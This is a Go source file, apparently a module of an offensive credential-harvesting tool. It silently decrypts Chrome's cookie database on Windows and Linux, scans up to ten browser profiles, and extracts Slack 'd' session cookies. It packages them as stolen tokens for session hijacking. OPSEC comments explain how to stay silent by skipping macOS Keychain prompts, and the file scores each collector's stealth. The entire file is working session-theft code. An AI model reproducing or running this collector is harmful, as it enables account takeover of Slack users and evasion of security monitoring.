//go:build !darwin

// Slack browser cookie collector — extracts d cookie via Chromium decrypt.
//
// Extracts the Slack `d` session cookie from Chrome's encrypted Cookies database.
// The `d` cookie is required alongside an xoxc token for Slack API calls using
// browser session credentials.
//
// OPSEC:
//   - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
//   - macOS: SKIPPED by default (Keychain prompt is user-visible)
//   - NOTE: Using the d cookie for API calls may trigger SOC alerts
package slack

import (
	"fmt"

	"github.com/ninken/ninloader-go/internal/chromium"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

var slackHostPatterns = []string{".slack.com"}
var slackCookieNameSet = map[string]struct{}{"d": {}}

func init() {
	registry.Register("slack", "browser_cookies", func() collector.Collector {
		return &BrowserCookiesCollector{
			BaseCollector: collector.BaseCollector{Svc: "slack", Src: "browser_cookies", Plats: []string{"linux", "windows"}},
		}
	})
}

// BrowserCookiesCollector extracts the Slack d session cookie from Chrome's
// encrypted Cookies database via the chromium package.
type BrowserCookiesCollector struct {
	collector.BaseCollector
}

func (c *BrowserCookiesCollector) Service() string    { return c.Svc }
func (c *BrowserCookiesCollector) Source() string      { return c.Src }
func (c *BrowserCookiesCollector) StealthScore() int   { return 5 }
func (c *BrowserCookiesCollector) Platforms() []string { return c.Plats }

// slackProfiles returns the list of Chrome profile directory names to scan.
func slackProfiles() []string {
	p := []string{"Default"}
	for i := 1; i <= 9; i++ {
		p = append(p, fmt.Sprintf("Profile %d", i))
	}
	return p
}

func (c *BrowserCookiesCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken
	chromeDir := platform.ChromeUserDataDir()

	for _, profile := range slackProfiles() {
		cookies, err := chromium.ExtractCookies(chromeDir, profile, slackHostPatterns, nil)
		if err != nil || len(cookies) == 0 {
			continue
		}

		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         fmt.Sprintf("%s/%s/Cookies", chromeDir, profile),
			AccountHint:  fmt.Sprintf("chrome:%s", profile),
			StealthScore: c.StealthScore(),
			Details: fmt.Sprintf(
				"Slack d cookie (browser session); platform=%s",
				platform.Platform(),
			),
		})
	}

	return results
}

func (c *BrowserCookiesCollector) Collect() []*types.CollectedToken {
	chromeDir := platform.ChromeUserDataDir()

	var results []*types.CollectedToken

	for _, profile := range slackProfiles() {
		cookies, err := chromium.ExtractCookies(chromeDir, profile, slackHostPatterns, nil)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to extract cookies from %s: %v", profile, err))
			continue
		}

		// Filter to the d cookie.
		var dCookies []chromium.Cookie
		for _, ck := range cookies {
			if _, ok := slackCookieNameSet[ck.Name]; ok {
				dCookies = append(dCookies, ck)
			}
		}

		if len(dCookies) == 0 {
			continue
		}

		for _, dCookie := range dCookies {
			// The d cookie value is the browser session token.
			// It's URL-encoded and starts with xoxd-.
			tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
			tok.AccessToken = types.Secure(dCookie.Value)
			tok.Extra["profile"] = profile
			tok.Extra["cookie_name"] = "d"
			tok.Extra["host"] = dCookie.Host
			tok.Extra["path"] = dCookie.Path
			tok.Extra["secure"] = dCookie.Secure
			tok.Extra["httponly"] = dCookie.HTTPOnly
			tok.Extra["platform"] = platform.Platform()
			tok.Extra["note"] = "d cookie for xoxc token API calls. WARNING: Using this may trigger SOC alerts."

			results = append(results, tok)

			c.Info(fmt.Sprintf(
				"Extracted Slack d cookie from chrome:%s (host=%s)",
				profile, dCookie.Host,
			))
		}
	}

	return results
}
